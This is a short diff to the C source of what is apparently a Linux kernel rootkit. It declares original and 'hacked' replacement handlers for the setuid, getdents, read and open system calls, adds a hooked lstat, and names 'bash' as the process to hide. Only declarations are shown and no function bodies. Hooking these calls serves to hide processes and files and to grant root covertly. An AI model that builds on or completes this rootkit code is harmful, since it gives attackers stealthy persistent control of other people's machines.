@@ -61,12 +61,16 @@ asmlinkage long (*orig_setuid)(uid_t uid);
 asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 asmlinkage long (*orig_read)(unsigned int fd, char *buf, size_t count);
 asmlinkage long (*orig_open)(const char __user *filename, int flags, umode_t mode);
+asmlinkage long (*orig_lstat)(const char __user *filename, 
+                              struct __old_kernel_stat __user *statbuf);
 
 // Hacked system calls
 asmlinkage long hacked_setuid(uid_t uid);
 asmlinkage long hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count);
 asmlinkage long hacked_open(const char __user *filename, int flags, umode_t mode);
+asmlinkage long hacked_lstat(const char __user *filename,
+            struct __old_kernel_stat __user *statbuf);
 
 char *HIDDEN_PROCESS = "bash";
 
